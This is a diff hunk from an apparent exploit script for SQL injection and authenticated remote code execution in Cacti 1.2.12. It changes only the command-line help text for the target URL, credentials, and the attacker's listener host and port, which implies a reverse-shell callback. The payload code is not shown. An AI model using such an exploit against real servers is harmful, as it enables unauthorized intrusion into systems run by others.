@@ -57,11 +57,11 @@ def sql_exploit(url1,username,password,lhost,lport):
 def main():
     parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution') 
 
-    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True) 
-    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
-    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
-    parser.add_argument('--lhost', metavar='<lhost>', help='Your IP Address', required=True)
-    parser.add_argument('--lport', metavar='<lport>', help='Your Listening Port', required=True)
+    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, Example: -t http://exploitcacti.com', required=True) 
+    parser.add_argument('-u', metavar='<user>', help='Example: -u admin', required=True)
+    parser.add_argument('-p', metavar='<password>', help="Example: -p password", required=True)
+    parser.add_argument('--lhost', metavar='<lhost>', help='Example: --lhost 127.0.0.1', required=True)
+    parser.add_argument('--lport', metavar='<lport>', help='Example: --lport 9001', required=True)
     args = parser.parse_args()
 
     url1 = args.t
